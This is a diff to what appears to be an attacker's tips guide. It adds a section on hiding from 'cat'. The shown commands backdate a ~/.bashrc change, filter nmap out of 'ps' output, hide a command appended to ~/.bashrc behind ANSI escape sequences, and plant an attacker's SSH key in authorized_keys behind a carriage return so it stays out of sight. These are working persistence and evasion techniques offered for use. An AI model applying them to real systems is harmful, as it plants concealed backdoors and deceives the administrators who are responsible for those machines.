@@ -50,3 +50,27 @@ Continuing from "Hiding a connection" the same technique can be used to hide a p
 echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
 && touch -r /etc/passwd ~/.bashrc
 ```
+
+### **Hide from cat**
+
+ANSI escape characters or a simple  ([carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/)) can be used to hide from `cat` and others.
+
+Hide the last command (example: `id`) in `~/.bashrc`:
+
+```
+echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
+### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A
+### moves the cursor 1 line up.
+### The '#' after the command 'id' is a comment and is needed so that bash still
+### executes the 'id' but ignores the two ANSI escape sequences.
+```
+
+Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b).
+
+Adding a  (carriage return) goes a long way to hide your ssh key from `cat`:
+
+```
+echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
+### This adds our key as the first key and 'cat authorized_keys' won't show
+### it. The $'\r' is a bash special to create a \r (carriage return).
+```
